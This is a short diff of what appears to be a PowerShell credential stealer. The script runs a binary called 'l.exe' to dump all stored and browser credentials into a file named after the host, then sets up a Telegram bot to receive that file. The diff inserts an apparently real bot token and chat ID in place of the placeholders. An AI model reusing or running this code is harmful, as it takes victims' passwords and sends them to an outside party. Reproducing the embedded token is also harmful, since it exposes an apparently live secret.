@@ -8,8 +8,8 @@ Start-Sleep -Milliseconds 15000
 .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
 
 # Send the result file to a Telegram bot
-# $bt = "bot-token"
-# $ci = "chat-id"
+$bt = "8546957670:AAHQRkkzY4EHmI2bSWPXTCnwv7hg1qhNzDQ"
+$ci = "8513010378"
 $ResultFile = "$Test\$env:computername.txt"
 
 try {
